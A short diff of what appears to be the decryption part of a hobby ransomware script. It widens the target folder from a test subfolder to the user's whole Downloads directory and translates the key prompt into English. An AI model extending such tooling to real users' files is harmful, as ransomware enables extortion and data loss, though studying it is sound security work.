@@ -14,11 +14,11 @@ def decrypt(items,key):
             file.write(decrypted_data)
 
 if __name__ == '__main__':
-    path_to_encrypt = '/home/anon23/Descargas/RansomWare/Files'
+    path_to_encrypt = '/home/anon23/Descargas/'
    
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt + '/' + item for item in items]
-    print('Introduzca su llave para desencriptar')
+    print('Input your key for decrypt')
     key = a.cargar_key()
     decrypt(full_path,key)
     if os.path.exists(path_to_encrypt + '/README.txt'):
